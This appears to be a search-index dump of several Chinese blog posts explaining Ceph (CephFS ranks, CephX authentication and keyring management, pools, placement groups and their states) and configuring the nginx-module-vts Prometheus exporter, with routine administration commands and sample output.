·CephFS元数据日志文件的体积可以无限增长以确保日志信息能顺序写入RADOS，并额外赋予守护进程修剪冗余或不相关日志条目的能力\n每个CephFS都会有一个易读的文件系统名称和一个称为FSCID标识符ID，并且每个CephFS默认情况下都只配置一个Active MDS守护进程\n一个MDS集群中可处于Active状态的MDS数量的上限由max_mds参数配置，它控制着可用的rank数量，默认值为1\nrank是指CephFS上可同时处于Active状态的MDS守护进程的可用编号，其范围从0到max mds-1 一个rank编号意味着一个可承载CephFS层级文件系统==目录子树==元数据管理功能的Active状态的ceph-mds守护进程编制，max_mds的值为1时意味着仅有一个0号rank可用。 刚启动的ceph-mds守护进程没有接管任何rank，它随后由MON按需进行分配 一个ceph-mds一次仅可占据一个rank，并且在守护进程终止时将其释放；一个rank只能被一个MDS所占用，被占用后其他MDS就不能再使用它了。 如果MDS名额数量少于进程数量，多余出来的进程只能处于备用模式。 一个rank可以处于下列三种状态中的某一种： Up：rank已经由某个ceph-mds守护进程接管 Failed：rank未被任何ceph-mds守护进程接管 Damaged：rank处于损坏状态，其元数据处于崩溃或丢失状态；在管理员修复问题并对其运行ceph mds repaired”命令之前，处于Damaged状态的rank不能分配给其它任何MDS守护进程 当新添加osd时，数据会将pg分配到新的osd上，如果此时影响集群访问。可以添加flag nobackfill：禁止数据回填 ，norebalance：禁止重平衡数据。在执行集群维护或者停机时，可以使用该flag\nceph osd set nobackfill # 增加\rceph osd unset nobackfill # 取消\r","permalink":"https://www.oomkill.com/2019/07/04-1-cephfs/","summary":"","title":"Ceph文件系统概述"},{"content":"prometheus 监控nginx的模块 nginx-module-vts\n下载后配置\nhttp{\rvhost_traffic_status_zone; vhost_traffic_status_zone shared:vhost_traffic_status:32m; # 设置共享内存大小\rserver {\rvhost_traffic_status_filter_by_set_key $status $server_name; # 计算详细的http状态代码的流量\rlocation /status {\rvhost_traffic_status_display; # 设置了该指令，则可以访问如下：\rvhost_traffic_status_display_format html;\rvhost_traffic_status off; ## 启用或禁用模块工作\r}\r}\r}\r不想统计流量的server区域禁用vhost_traffic_statu off\n例： 计算upstream后端响应时间 nginx_upstream_responseMsec{upstream=“group1”}\n一个完整的配置文件：nginx.conf 关于GEO相关：GeoIP.dat file format #162 ngx如何配置GEO：GeoIP discontinuation; Upgrade to GeoIP2 with nginx on CentOS 删除所zone内存中的数据\ncurl localhost/status/control?cmd=delete\u0026amp;group=*\r","permalink":"https://www.oomkill.com/2019/07/prome-nginx-module-vts/","summary":"","title":"用于监控nginx的exporter：nginx-module-vts"},{"content":"如果需要与osd打交道，需要通过mon检索集群运行图才能够访问的客户端，通常经由mon认证后才能访问ceph存储。Ceph本身实现了数据服务的认证访问和授权控制机制，CephX协议来实现\nCephX Protocol\nCephX本身只负责认证和授权检测，不处理通讯过程是否加密。一般来讲需要与moniotr交互的客户端组件（OSD、RBD、RGW等）一般而言都经由CephX认证\nCephX认证机制 Ceph使用cephx协议对客户端进行身份认证\n每个MON都可以对客户端进行身份验正并分发密钥，不存在单点故障和性能瓶颈。（在集群模式下，任何一个monitor在实现认证时是无状态的，每个monitor都能完成身份检验的任务） MON会返回用于身份验正的数据结构，其包含获取Ceph服务时用到的session key session key通过客户端密钥进行加密，需事先有一个预共享秘钥存在 客户端使用session key向MON请求所需的服务。session key只是拿来做中间通讯使用。 MON向客户端提供一个ticket，用于向实际处理数据的OSD等验正客户端身份。 MON和OSD共享同一个secret，因此OSD会信任由MON发放的ticket ticket存在有效期限 注意：\nCephX身份验正功能仅限制Ceph的各组件之间，它不能扩展到其它非Ceph组件。 它并不解决数据传输加密的问题。 为了实现Cephx认证，Ceph服务器端一定会为每一个客户端事先生成一个密码\n认证与授权 无论Ceph客户端时何类型，Ceph都会在存储池中将所有的数据存储为对象\nCeph用户需要拥有存储池访问权限才能读取和写入数据\nCeph用户必须拥有执行全年才能使用Ceph管理命令\n相关概念\n用户\n用户是指个人或系统参与者（例如应用） 通过创建用户，可以控制谁（或哪个参与者）能够访问Ceph存储集群、以及可访问的存储池及存储池中的数据。 Ceph支持多种类型的用户，单可管理的用户都属于Client类型 区分用户种类的原因在于，mon、osd、mds等系统组件也使用cephx协议，但它们非为客户端 通过点号来分隔用户类型和用户名，格式为TYPE.ID，例如：client.admin等 授权\n使能（Capabilities）\nCeph基于\u0026quot;使能(caps)\u0026ldquo;来描述用户可针对MON、OSD或MDS使用的权限范围或级别。 通用语法格式：daemon-type'allow caps[...] MON使能 包括r、w、x和allow profile cap 例如：mon allow rwx，以及mon allow profile osd\u0026rsquo;等。 OSD使能 包括r、w、x、class-read、class-write和profile osd 此外，OSD使能还允许进行存储池和名称空间设置。如为指定表示对所有OSD所有存储池都获得相关授权 MDS使能 只需要allow，或留空 各使能的意义\nallow\n需先于守护进程的访问设置指定 仅对MDS表示rw之意，其它的表示字面意义 r：读取权限，访问MON以检索CRUSH时依赖此使能\nw：对象写入权限\nx：调用类方法（读取和写入）的能力，以及在MON上执行auth操作的能力。\nclass-read：x能力的子集，授予用户调用类读取方法的能力\nclass-write：x的子集，授予用户调用类写入方法的能力\n·*：授予用户对特定守护进程/存储池的读取、写入和执行权限，以及执行管理命令的能力。\nprofile osd\n授予用户以某个OSD身份连接到其他OSD或监视器的权限 授予OSD权限，使OSD能够处理复制检测信号流量和状态报告 profile mds\n授予用户以某个MDS身份连接到其他MDS或监视器的权限 profile bootstrap-osd\n授予用户引导OSD的权限 授权给部署工具，使其在OSD加入集群时，引导OSD时有权添加密钥 profile bootstrap-mds\n授予用户引导元数据服务器的权限 授权给部署工具，使其在引导元数据服务器时有权添加密钥 用户管理 keyring 保存在ceph集群内部的整体信息，统一的账号存储文件，存放多个用户及其秘钥信息\nkeyring file：单独被导出的文件，如ceph.client.admin.keyring\nCeph集群管理员能够直接在Ceph集群中创建、更新和删除用户·创建用户时，可能需要将密钥分发到客户端，以便将密钥添加到==密钥环==\n列出用户\n命令：ceph auth list 用户标识：TYPE.ID，因此，osd.0表示OSD类型的用户 （osd专用于系统参与者不是真正客户端用户）。，用户ID为0 检索特定用户\n命令：ceph auth get TYPE.ID或者ceph auth export TYPE.ID 添加用户\nceph auth add：规范方法，它能够创建用户、生成密钥并添加指定的caps ceph auth get-or-create：简便方法，创建用户并返回密钥文件格式的密钥信息，或者在用户存在时返回用户名及密钥文件格式的密钥信息\n$ ceph auth add client.testuser mon 'allow r' osd 'allow rw pool=rbdpool' added key for client.testuser\r$ ceph auth get client.testuser\rexported keyring for client.testuser\r[client.testuser]\rkey = AQBuyw5d+GcJBxAAYF3dkO4qcAA/B/gOt91T1Q==\rcaps mon = \u0026quot;allow r\u0026quot;\rcaps osd = \u0026quot;allow rw pool=rbdpool\u0026quot;\rceph auth get-or-create-key：简便方法，创建用户并返回密钥信息，或者在用户存在时返回密钥信息\n注意：典型的用户至少对Ceph monitor 具有读取功能，并对Ceph OSD具有读取和写入功能；另外，用户的OSD权限通常应该限制为只能访问特定的存储池，否则，他将具有访问集群中所有存储池的权限\n列出用户秘钥\nceph auth print-key {TYPE.ID} 导入用户\nceph auth import 需要指定秘钥环 修改用户caps\nceph auth caps 会覆盖用户现有的caps，因此建立事先使用ceph auth get {TYPE.ID}命令查看用户的caps 若是为添加caps，则无需先指定现有的caps 命令格式：ceph auth caps {TYPE.ID} daemon 'allow [r|w|x|*|...] [{pool=pool-name}] $ ceph auth caps client.testuser mon 'allow rw' osd 'allow rw pool=rbdpool'\rupdated caps for client.testuser\r$ ceph auth get client.testuser\rexported keyring for client.testuser\r[client.testuser]\rkey = AQBuyw5d+GcJBxAAYF3dkO4qcAA/B/gOt91T1Q==\rcaps mon = \u0026quot;allow rw\u0026quot;\rcaps osd = \u0026quot;allow rw pool=rbdpool\u0026quot;\r删除用户\nceph auth del {TYPE.ID} keyring keyring是一个集合，能够同时存储secret、password、keys、certificates并且使得他们能够被某一个应用程序能用的文件的集合。\n任何一个客户端在联系monitor时，会查找本地适用于当前应用程序的keyring文件，以获取自己能够认证的ceph集群的认证信息。\nceph-authtool用来创建、修改、查看keyring文件的内容\n访问Ceph集群时，客户端会于本地查找密钥环，默认情况下，Ceph会使用以下四个密钥环名称预设密钥环\n/etc/ceph/{cluster-name}.{user-name}.keyring: 保存单个用户的keyring /etc/ceph/cluster.keyring： 保存多个用户的keyring /etc/ceph/keyring /etc/ceph/keyring.bin：二进制格式，被编码后 {cluster-name}是为集群名称，{user-name}是为用户表示{TYPE.ID} client.admin用户的在名为ceph的集群上的密钥环文件名为ceph.client.admin.keyring\n管理keyring 创建keyring\nceph auth add等命令添加的用户还需要额外使用ceph-authtool命令为其创建用户秘钥 ceph客户端通过keyring文件查找用户名并检索秘钥，命令：ceph-authtool --create-keyring /path/to/keyring 注意\nkeyring文件一般应该保存于/etc/ceph目录中，以便客户端能自动查找 创建包含多个用户的keyring文件时，应该使用`cluster-name.keyring``为文件名 创建仅包含单个用户的kerying文件时，应该使用cluster-name.user-name.keyring作为文件名 将用户添加至keyring\n可将某个用户从包含多个用户的keyring中导出，并保存于一个专用的keyring文件， ==命令==：ceph auth get TYPE.ID -o /etc/ceph/cluster-name.user-name.keyring 也可将用户的keyring合并至一个统一的keyring文件中， ==命令==：ceph-authtool /etc/ceph/cluster-name.keyring -import-key /etc/ceph/cluster-\rname.user-name.keyring 使用ceph-authtool命令管理用户 ceph-authtool 命令可以直接创建用户、授权caps并创建keyring\nceph-authtool keyringfile [-C | --create-keyring]\r[-n | --name entityname] [--gen-key] [-a | --add-key base64_key] [--cap | --caps capfile]\r命令选项\n-C，--create-keyring：创建一个新的密钥环，覆盖任何现有的密钥环文件 --gen-key：将为指定的实体名生成新的密钥 --add-key：将为密钥环添加编码密钥 --cap subsystem capability 将设置给定子系统cap文件的功能 --caps capfile 将为所有子系统设置与给定密钥关联的所有功能 注意：此种方式添加的用户仅存在于keyring文件中，管理员还需要额外将其添加至Ceph集群上\n命令：ceph auth add {TYPE.ID} -i /PATH/TO/keyring 创建k8s使用的账号\n$ ceph auth get-or-create client.kube mon 'allow r' osd 'allow * pool=kube'\r[client.kube]\rkey = AQAwfA9dff8nGRAAMsF1VlKRPS/NEFOnB057OQ==\r$ ceph auth get client.kube\rexported keyring for client.kube\r[client.kube]\rkey = AQAwfA9dff8nGRAAMsF1VlKRPS/NEFOnB057OQ==\rcaps mon = \u0026quot;allow r\u0026quot;\rcaps osd = \u0026quot;allow * pool=kube\u0026quot;\r$ ceph auth get client.kube -o ./ceph.client.kube.keyring\rexported keyring for client.kube\rceph-authtool --create-keyring cluster.keyring\rceph-authtool cluster.keyring --import-keyring ./ceph.client.kube.keyring\rceph-authtool cluster.keyring --import-keyring ./ceph.client.admin.keyring\r","permalink":"https://www.oomkill.com/2019/06/07-1-cephx/","summary":"","title":"Ceph安全 - CephX"},{"content":"初识Ceph Ceph 是一个开源分布式存储系统系统，它不是一种单一的存储，而是面向云提供一种统一存储平台，包含块存储 RBD, 文件存储 CephFS, 以及对象存储 RGW，这种存储的出现允许用户拜托供应商的绑定，它可以提供块存储到 “云平台”，也可以提供对象存储到 “应用”，并支持理论上的无限扩展性，数千客户端访问 PB 甚至 EB 级别的数据\nSAN VS Ceph 与传统 SAN 存储相比，Ceph 客户端会计算他们所需的数据所在的位置，这消除了存储系统中需要在“中心化查找”的瓶颈。 这使得 Ceph 集群可以在不损失性能的情况下进行扩展。\nCeph 集群架构组成 Ceph 集群核心是 RADOS，而基于 RADOS，构建出多种类型存储，块存储, 文件系统, 对象存储，而一个基础的 Ceph 集群的组件由 \u0026ldquo;Ceph monitor\u0026rdquo; 与 \u0026ldquo;Ceph OSD Daemon\u0026rdquo; 组成\nCeph Monitor（进程名称为 ceph-mon，下文中以 ceph-mon 代表 Ceph Monitor） 维护集群映射的主副本。 ceph集群中的monitor，可确保 ceph-mon 守护进程在失败时的高可用性。客户端从 ceph-mon 检索集群映射的副本。 Ceph OSD Daemon 检查”自身“及”其他“ OSD 的状态并报告给 Monitor。 Ceph 中的常见术语 Application 用于使用 Ceph 集群的任何 Ceph 外部的应用程序\nBlock Device 也称为 “RADOS 块设备” 或 ”RBD“ ，协调基于块的数据存储的工具，Ceph块设备拆分基于块的应用程序数据 成“块”。 RADOS 将这些块存储为对象。 Ceph 块 设备协调这些对象的存储 存储集群。\n也称为 “RADOS Block Device” 或 “RBD”。一种用于协调 Ceph 中基于块的数据的存储的软件。 Ceph 块设备将基于块的应用程序数据拆分为 “Chunk”。 RADOS 将这些块存储为对象。\nChunk 与 Block 是两种不同的概念\nChunk 存储是类似于 Key-Value 存储和对象存储，是一种结构化数据，并固定大小的块\nBlock 通常被提到的上下文是作为硬件接口提供的，通常代表硬件裸设备\n所以说 Block Device 是将数据划分为固定大小的 Chunk，存储在 Block 上。\nMGR (Manager) Ceph Manager 又称为 Ceph Manager Daemon，进程名称为 ceph-mgr, 是与 Ceph Monitoring 一起运行的守护进程，用于提供监视以及与外部监视和管理系统的接口。自 Luminous 版本 (12) 起，ceph-mgr 没有运行的情况下 Ceph 集群无法正常运行。\nMON (Monitor) Ceph Monitor 维护集群状态影视的守护进程，这些“集群状态”包括 Monitor map、Manager map、OSD map 和 CRUSH map。 Ceph 集群必须至少包含三个正在运行的 Monitor，才能实现冗余和高可用性。\nOSD Ceph Object Storage Daemon，又被称为 OSD, 在 “research and industry” 中 OSD 表示 ”对象存储设备“，而 Ceph 社区将 OSD 称为 OSD daemon，用于与逻辑磁盘交互的进程。\nOSD fsid 用于标识 OSD 的唯一标识符。它可以在 OSD 路径中名为 osd_fsid 的文件中找到。术语 “fsid” 与 “uuid” 互换使用\nOSD id 定义 OSD 的 integer，它是在创建每个 OSD 期间由监视器生成的。\nHybrid OSD 指同时拥有 HDD 和 SSD 的 OSD\nCluster Map 由 monitor map、OSD Map、PG Map、MDS Map 和 CRUSH Map 组成的一组 Map，它们共同报告 Ceph 集群的状态。有关详细信息。\nCRUSH CRUSH Controlled Replication Under Scalable Hashing 可扩展散列下的受控复制，Ceph 用于计算对象存储位置的算法。\nDAS DAS Direct-Attached Storage 直接附加存储，无需访问网络直接连接计算机的存储。例如 SSD\nLVM tags Logical Volume Manager tags 逻辑卷管理器标签，LVM “卷” 和 “组” 的可扩展元数据。它们用于存储有关设备及其与 OSD 关系的 Ceph 特定信息。\nPGs (Placement Groups) “放置组” 是每个逻辑 Ceph Pool 的子集。放置组执行将对象（作为一个组）放置到 OSD 中的功能。 Ceph 在内部以“放置组粒度”来管理数据：这比管理单个RADOS 对象的扩展性将更好。具有较大数量放置组的集群比具有较少数量放置组的其他相同集群具有更好的平衡性。\nPools 池是用于存储对象的逻辑分区。\nRADOS Reliable Autonomic Distributed Object Store 可靠的自动分布对象存储，RADOS 是为可变大小的对象提供可扩展服务的对象存储。 RADOS 对象存储是 Ceph 集群的核心组件。\nBlock Storage 块存储是 Ceph支持的三种存储类型之一。 Ceph 块存储指的是块存储 结合使用时的相关服务和功能 集合\nCeph File System Ceph File System (CephFS) 是一个兼容 POSIX 的文件系统，构建在 RADOS 之上，可根据按需部署\nMDS (Metadata Server) Ceph MetaData Server daemon MDS，构建在 RADOS 之上，存储所有文件的元数据作为”文件系统“类型的存储提供给用户，运行的程序名为 ceph-mds，故 也是是否使用 CephFS 的标记\nRGW (Radow Gateway) Ceph 提供兼容 Amazon S3 RESTful API 和 OpenStack Swift API 的组件，可根据按需部署\nRealm 是位于对象存储中的上下文，领域 (Realm) 是一个全局唯一的命名空间，由一个或多个区域组组成。\nZone 是位于对象存储中的上下文，区域 (zone) 是由一个或多个 RGW 实例组成的逻辑组。\u0026ldquo;zone\u0026rdquo; 的配置状态存储在 \u0026quot;\u0026quot; 中\nPeriod 是位于对象存储中的上下文，Period 是 Realm 的配置状态。该 Period 存储多站点配置的配置状态。当 Period 被更新时，“epoch” 被认为已经改变。\nCephX CephX Ceph authentication protocol；CephX 是用于对用户和守护进程进行身份验证。 CephX 的运行方式类似于 Kerberos，但它没有单点故障。\nSecrets Secret 是用户访问是需要提供的身份验证的系统用于执行数字身份验证的凭据。\nCeph存储集群组成 Ceph 存储集群由多种类型的守护进程组成：\nCeph Monitor Ceph OSD Daemon Ceph Manager Ceph Metadata Server OSD (Object Storage Device) 对象存储设备 OSD (Object Storage Device) 通常是指==单独的磁盘设备==，每个 Ceph Node 上有一个或多个o OSD，每一个 OSD 是真正存放数据的地方（在文件系统中同样概念为文件与目录）；OSD不是主机。由多个 Ceph Node 组合起来称为 RADOS Cluster\n为了使每个 OSD 能够被单独使用和管理，每个 OSD 都会有一个单独的专用的守护进程被称为 ceph-osd。OSD 本身用来存储数据，还包括数据复制、恢复、数据重新均衡、提供监视信息给mon和mgr\n一个集群至少有 3个 Ceph OSDs，已确保高可用。选择 OSD 冗余时，应自己指定故障率，故障转移率或故障容忍率。OSD级别故障就在OSD级别冗余，主机级别就跨主机冗余，故障率是机架级别就机架冗余。 在做crush运行图的设定时是应该自己指定的。\n(MGR Manager) Mgr (Manager) 集群元数据服务器，维护集群映射的主副本。Ceph 监视器集群可确保监视器守护进程发生故障时的高可用性。存储集群客户端从 Ceph Monitor 检索集群映射的副本。\nmonitor在每一次读数据都是实时查询的，故monitor不适用频繁周期性采集数据的监控操作。在Ceph新版中引入新组建mgr，（早期Ceph版本是没有mgr的）用来专门维护查询类操作，将查询操作按照自己内部空闲方式缓存下来，一旦有监控可及时响应。\nmgr是在一类节点上运行的守护进程，一般为两个活以上节点，此类守护进程被称为ceph-mgr。主要功能在于跟踪运行时的指标数据。如磁盘使用率、CPU使用率。以及集群当前状态，此状态不是内部运行状态，而是查询做监控时的状态。包括存储空间利用率、当前性能指标、节点负载（系统级）等\nMON (Monitor) 一个 Ceph 集群内除了存储节点之外，还有另外一种节点 Monitor ，用来管理整个集群的，如有多少个节点，每个节点上有多少个OSD，每个OSD是否健康，他会持有整个集群的运行图（运行状态）。mon是用来集中维护集群元数据而非文件元数据。为了维护整个集群能够正常运行而设定的节点，离开此节点集群内部就无法协调。\n在一个主机上运行的守护进程 ceph-mon，守护进程扮演、监视着整个集群所有组件的角色，被称为集群运行图的持有者cluster map（整个集群有多少存储池，每个池中有多少PG，每个PG映射哪个OSD，有多少OSD等等）集群运行图 Cluster Map\nmonitor负责维护整个进群的认证信息并实行认证，认证协议叫 ==CephX== 协议（ceph内部的认证协议）。monitor用来维护认证信息并实行认证。认证中心 monitor自身是无状态的，所以实现均衡认证负载。\nmonitor的高可用自己内部直接使用POSIX协议来实现数据冗余，monitor也是节点级冗余，为了确保各节点数据是强一致的，每个节点都可写，写完后会同步到其他节点。为了避免同时写导致的冲突，使用了分布式一致性协议，monitor就是使用POSIX协议来进行分布式协作的。\nMDS (Metadata Server) ==Ceph Metadata Server== 用来代表ceph文件系统而提供的守护进程ceph-mds，如不使用CephFS，此进程是无需启动的。利用底层RADOS存储空间，将存储空间抽象成文件系统，来兼容POSIX file system 提供服务。\nNote: 一个基础的 Ceph 存储集群由，OSD, Monitor, Manager 组成\nCeph集群中其他概念 客户端接口 Ceph 存储集群提供了基础的对象数据存储服务，客户端可基于RADOS协议和 librados API 直接与存储系统交互进行对象数据存取 Librados Librados提供了访问 RADOS 在存储集群支持 “异步” 通信的 API 接口，支持对集群中对象数据的的直接并行访问，用户可通过支持的编程语言开发自定义客户端程序通过RADOS协议与存储系统进行交互 客户端应用程序必须与librados绑定方可连接到RADOS存储集群，因此，用户必须实现安装librados及其依赖后才能编写使用librados的应用程序。 librados API本身使用 C++ 编写的，它额外支持C、Python、Java、和PHP等开发接口 当然，并非所有用户都有能力自定义开发接口以接入RADOS存储集群的需要，为此，Ceph也原生提供了几个较高级别的各户端接口，它们分别是 RADOS GateWay (RGW), Reliable Block Device (RBD) 和 MDS (MetaData Server)，分别为用户提供 RESTFUL、块和 POSIX 文件系统接口 管理节点 (Admin Host) Ceph通常是分布式集群，为了便于去管理维护整个集群，通常在Ceph集群中找一个专门的节点用来当管理节点。此节点可以连接至每一个节点用来管理节点上的Ceph守护进程。\nCeph的管理接口是一系列命令行工具，例如 rados, ceph, rbd 等命令，管理员可以从某个特定的MON节点执行管理操作，但也有人更倾向于使用专用的管理节点。\nNote: 在早期 (Ceph-deploy) 部署的集群，通常管理节点是必要的，但使用 cephadm 部署的集群，实际上管理管理节点可以在任何位置\nPool Ceph所提供的存储空间（没有目录之类一说）是将“所有对象都是存储在数据平面上”，因此，所有对象都不能同名。RADOS 将他的存储空间切分为多个分区以便好进行管理。每一个分区叫做一个“存储池”。存储池的大小是取决于底层的存储空间的。与真正意义上的分区不是一回事。在Ceph中每一个存储池存放的数据了也可能会太大，所以存储池也可以进一步划分（可选）。被称为名称空间（先切分为存储池，每个存储池可进一步被划分成名称空间） 两级逻辑组件。\n第三级 PG 每一个存储池内部会有多个PG（Placement Groups 规置组）存在。Pool 与 pg 都是抽象的概念。\nObject 对象是自带元数据的组件，\n对象id，每一个对象应有一个对象ID在集群内部来引用对象 数据 元数据 key vlaue类型的数据 这些类型打包成一起存储，被称为一个对象。RADOS集群会吧真正存储的每一个文件，切分成N个对象来进行存储的。（切分个数与默认对象切分大小有关）。\n每一个对象都是被单独管理的，都拥有自己的标识符。因此， 同一个文件的object有可能被映射到不同的PG上，PG提交给主机的，由主机负责将对象存储在磁盘（OSD）被存储在不同的OSD上。\n文件存储到RADOS集群 一般要接入RADOS集群必须通过客户端来实现(LIBRADOS、RBD、CephFS、RADOSGW)，才能接入到集群中来。\n当将文件存入Ceph中时，需要通过某一类客户端接入，客户端接入时，需要借助于 Ceph 存储API接口将其切分为固定大小的存储对象(Date object)，此数据对象究竟被放置在哪个 OSD 上存放这中间是靠 crush 来完成的。数据对象被存放在哪个存储池上是固定的。存储池需创建才可使用。但PG是虚拟的中间层。\n","permalink":"https://www.oomkill.com/2019/06/01-1-ceph-acquaintance/","summary":"","title":"Ceph概念 - 初识Ceph"},{"content":"关于存储池 从某种意义上来讲，RADOS所提供的存储空间的管理接口，不应该将其放置在同一个平面当中，因此将其切割成多个不同的\u0026quot;逻辑存储空间\u0026quot;，称之为存储池。\nRADOS存储集群提供的基础存储服务需要由\u0026quot;存储池（pool）\u0026ldquo;分割为逻辑存储区域，此类的逻辑区域亦是对象数据的名称空间。\n实践中，管理员可以为特定的应用程序存储不同类型数据的需求分别创建专用的存储池，例如rbd存储池，rgw存储池等，也可以为某个项目或某个用户创建专有的存储池。 存储池还可以再进一步细分为一至多个名称空间（namespace）。同一个存储池内，无论属于哪个、哪些名称空间，数据都是被存储池中的PG进行存放，虽然处于不同名称空间，但可能处于同一个PG之上。 客户端(包括rbd和rgw等）存取数据时，需要事先指定存储池名称、用户名和密钥等信息完成认证，而后将一直维持与其指定的存储池的连接，于是也可以吧存储池看做是客户端的IO接口。 存储池类型\n副本池（replicated）：任何一个数据对象存储在此类存储池中其冗余机制是通过创建多个数据对象副本来实现的，而副本数量是用户在创建存储池时指定。如，创建存储池时没指定类型，就是副本池，默认副本数量为3个（1主两从），统称副本数量。把每个对象在集群中存储为多个副本，其中存储于主OSD的为主副本，副本数量在创建存储池时由管理员指定；副本池类型为Ceph为默认的存储池类型。但是此存储池是非常浪费存储空间的。副本池对读IO有很好的附带表现 纠删码池（erasure code）：使用校验码可计算回数据。把各对象存储为N=K+M个块，其中，K为数据块数量，M为编码块数量，因此存储池的尺寸为K+M；纠删码块的数据就 是允许冗余的级别。如4+2，即允许最多两个数据块丢失。不是所有的应有都能支持纠删码池，如rbd必须使用副本池。radosGW可以使用纠删码池。 副本池IO\n将一个数据对象存储为多副本 写入操作时，Ceph客户端使用CRUSH算法来计算对象的PG ID和Primary OSD 主OSD根据设定的副本教、对象的名称、存储池名称和集群运行图（Cluster Map）计算出PG的各铺助OSD，而后由主OSD将数据同步给这些辅助OSD。 对于有着三个副本的存储池来讲，任何一个PG都会选择三个OSD，因此，副本池所关联的OSD数量通常与冗余量相同。OSD，成为一个活动集。如图所示，其中一个OSD为主OSD负责读写操作，另外两个OSD负责从主OSD同步数据。当三个副本都存完，才能的到存储完成的消息的。客户的只需与主OSD通信，同步过程是OSD内部自行实现的。\n纠删码池IO\n纠删码是一种前向纠错码（FEC）代码\n通过将K块的数据转换为N块，假设N=K+M，则其中的M代表纠删码算法添加的额外活冗余的块数量以提供冗余机制（即编码块），而N则表示在纠删码编码之后要创建的块的总数，其可以故障的块数为M（即N-K）个。 类似于RAID5 纠删码池减少了确保数据持久性所需的磁盘空间量，但计算量上却比副本存储池要更贵一些 RGW可以使用纠删码池，但RDB不支持。\n例如，把包含数据ABCDEFGHI的对象NYAN保存到存储池中，假设纠删码算法会将内容分割为三个数据块：第一个包含ABC，第二个为DEF，最后一个为GHI，并为这三个数据块额外创建两个编码块：第四个YXY和第五个GQC，此时纠删码算法会通过计算哪家出GHI、和YXY\n副本池所有从OSD没有次序之分，只有主和从两类角色之分，各个从没有次序。纠删码池是有次序的，这个顺序代表数据拼凑起来的数据。因此，每个分片应指定其在整个数据文件的偏移量是多少。\n归置组 归置组（PlacementGroup）是用于跨OSD将数据存储在某个存储池中的内部数据结构。\n相对于存储池来说，PG是一个虚拟组件，它是对象映射到存储池时使用的虚拟的层 出于规模伸缩及性能方面的考虑，Ceph将存储池细分为归置组，吧每个单独的对象映射到归置组，并将归置组分配给一个主OSD 存储池由一系列的归置组组成，而CRUSH算法则根据集群运行图和集群状态，将各PG均匀、伪随机地分布到急群众的OSD之上。 若某OSD失败或需要对集群进行重新平衡，Ceph则移动或复制整个归置组而无需单独寻址每个对象。 归置组在OSD守护进程和Ceph客户端之间生成了一个中间层，CRUSH算法负责将每个对象动态映射到一个归置组，然后再将每个归置组动态映射到一个或多个OSD守护进程，从而能够支持在新的OSD设备上线时动态进行数据重新平衡。\n归置组作用\n在存储池中存放100w数据对象，而使用100个归置组，一组内存放1w对象。归置组是从新平衡和恢复时的基本单元。使得数据单元不至于以文件或对象为单位。\n归置组计数 归置组的数量有管理员在创建存储池是指定，而后由crush负责创建和使用\n通常，PG的数量应该是数据的合理粒度的子集 例如，一个包含256个PG的存储池意味着每个PG包含大约1/256的存储池数据 当需要将PG从一个OSD移动到另一个OSD时，PG的数量会对性能产生影响 PG数量过少，Ceph将不得不同时移动相当数量的数据，其产生的网络负载将对集群的正常性能输出产生负面影响。 而在过多的PG数量场景中在移动极少量的数据时，Ceph将会占用过多的CPU和RAM，从而对集群的计算资源产生负面影响。 PG数量在集群分发数据和重新平衡时扮演着重要作用 在所有OSD之间进行数据持久存储及完成数据分布会需要较多的归置组，但是它们的数量应该减少到最大性能所需的最小数量值，以节省CPU和内存资源 一般说来，对于有着超过50个OSD的RADOS集群，建议每个OSD大约有50-100个PG以平衡资源使用，取的更好的数据持久性和数据分布，更大规模的集群中，每个OSD大约可持有100-200个PG 至少应该使用多少个PG，可通过下面的公式计算后，将其值以类似于四舍五入到最近的2的N次幂 (Total OSDs * PGPerOSD/Replication factor =\u0026gt; Total PGs ) 可以使用的PG数量 = 总OSD数量* 每个OSD可以有多少个PG/复制因子（副本数量） 一个RADOS集群上可能会存在多个存储池，因此管理员还需要考虑所有存储池上的PG分布后每个OSD需要映射的PG数量 PG数量一定是2的N次方倍，这样进行hash计算时，速度才会更快。Ceph要求每一个OSD上最多不能超过256个PG 归置组状态 依据PG当前的工作特性活工作进程所阶段，它总是处于某个活某些个“状态中”，最常见的状态应该为active+clean\nPG的常见状态\nActive 主OSD和各辅助OSD均处于就绪状态，可正常服务于客户端IO请求 一般Peering操作过程完成后即会转入Active状态 Clean 主OSD和各辅助OSD均处于就绪状态，所有对象的副本数量均符合期望，并且PG的活动集和上行集为同一组OSD。 活动集(Acting Set)：由PG当前的主OSD和所有的处于活动状态的辅助OSD组成，这组OSD负责执行此PG上数据对象的存取操作I/O 上行集(Up Set)，根据CRUSH的工作方式，集群拓扑架构的变动将可能导致PG相应的OSD变动活扩展至其他的OSD之上，这个新的OSD集也成为PG的“（Up Set）”，其映射到的新OSD集可能不分地与原有OSD集重合，也可能会完全不相干；上行集OSD需要从当前的活动集OSD上复制数据对象，在所有对象同步完成后，上行集便成为新的活动集，而PG也将转为“活动（active）”状态。 Peering 如数据不一致，需将数据复制过去，这个复制数据过程就称之为对等过程。 一个PG中的所有OSD必须就它们持有的数据对象状态达成一致，而“对等（Peering）”即为其OSD从不一致转为一致的过程。 Degraded 在某OSD标记为“down”时，所有映射到此OSD的PG即转入“降级（degraded）”状态 此OSD重新启动并完成Perring操作后，PG将重新转回clean 一旦OSD标记为down的时间超过5分钟，它将被标记出集群，而后Ceph将对降级状态的PG启动回复操作，直到所有因此而降级的PG重回clean状态 在其内部OSD上某对象不可用活悄然崩溃时，PG也会被标记为降级状态，知道对象从某个权威副本上正确恢复。 Stale 过期 每个OSD都要周期性的向RADOS集群中的监视器报告其作为主OSD所持有的所有PG的最新统计数据，因任何原因导致某个主OSD无法正常向监视器发送此类报告，或者由其他OSD报告某个OSD已经down掉，则所有以此OSD的PG将立刻被标记为stale状态。 Undersized PG中的副本数少于其存储池定义的个数时即转入undersized状态，回复和回填操作在随后会启动已修复其副本为期望值 Scrubbing 一致性保障的非常重要机制，文件完整性检查 各OSD还需要周期性的检查其所持有的数据对象的完整性，以确保所有对等OSD上的数据一致；处于此类检查过程中的PG便会被标记为scrubbing状态，这也通常被称作light scrubs、shallow scrubs或者simply scrubs。 另外，PG还需偶尔需要进行deep scrubs检查以确保同一对象在相关的各OSD上能按位匹配，此时PG将处于scrubbing+deep状态。 Recovering 恢复 添加一个新的OSD至存储集群中或某OSD宕掉时，PG则由可能会被CRUSH重新映射进而将持有与此不同的OSD集，而这些处于内部数据同步过程中的PG则被标记为recovering状态； Backfilling 回填 新OSD加入存储集群后，Ceph则会进入数据重新均衡的状态，即一些数据对象会在进程后台从现有OSD移到新的OSD之上，此操作过程为backfill。 CRUSH 